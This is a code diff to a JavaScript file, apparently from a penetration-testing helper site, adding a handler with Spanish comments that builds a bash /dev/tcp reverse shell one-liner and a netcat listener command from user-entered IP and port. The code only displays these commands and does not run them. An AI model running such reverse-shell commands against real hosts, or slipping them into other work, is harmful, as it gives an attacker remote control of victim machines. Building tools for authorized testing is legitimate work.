@@ -3208,4 +3208,40 @@ document.addEventListener('DOMContentLoaded', function() {
         // Init
         renderPorts();
     })();
+    /* ─── ACTUALIZACIÓN EN TIEMPO REAL (REVERSE SHELL) ─── */
+document.addEventListener('DOMContentLoaded', function() {
+    // 1. Buscamos las cajas de texto de tu web usando los IDs que pusiste en el PHP
+    const ipInput = document.getElementById('rs-ip');
+    const portInput = document.getElementById('rs-port');
+    const outputArea = document.getElementById('rs-output');
+    const listenerArea = document.getElementById('rs-listener');
+
+    // Si estamos en la página de Reverse Shell (existen estos elementos), activamos la magia
+    if (ipInput && portInput && outputArea) {
+        
+        // 2. Esta es la función que reconstruye el comando
+        const updateRealTime = () => {
+            // Cogemos los valores que haya escrito el usuario (o los de por defecto)
+            const ip = ipInput.value.trim() || '10.10.14.5';
+            const port = portInput.value.trim() || '4444';
+            
+            // Formamos el comando base (aquí puedes añadir luego lógica para distintos lenguajes)
+            const command = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
+            
+            // Inyectamos el comando en la caja negra y actualizamos el Listener
+            outputArea.textContent = command;
+            
+            if(listenerArea) {
+                listenerArea.textContent = `nc -lvnp ${port}`;
+            }
+        };
+
+        // 3. ¡LA MAGIA! Le decimos que ejecute la función CADA VEZ que el usuario teclee algo ('input')
+        ipInput.addEventListener('input', updateRealTime);
+        portInput.addEventListener('input', updateRealTime);
+
+        // 4. Ejecutamos la función una vez al cargar la página para que la caja no empiece vacía
+        updateRealTime();
+    }
+});
 });
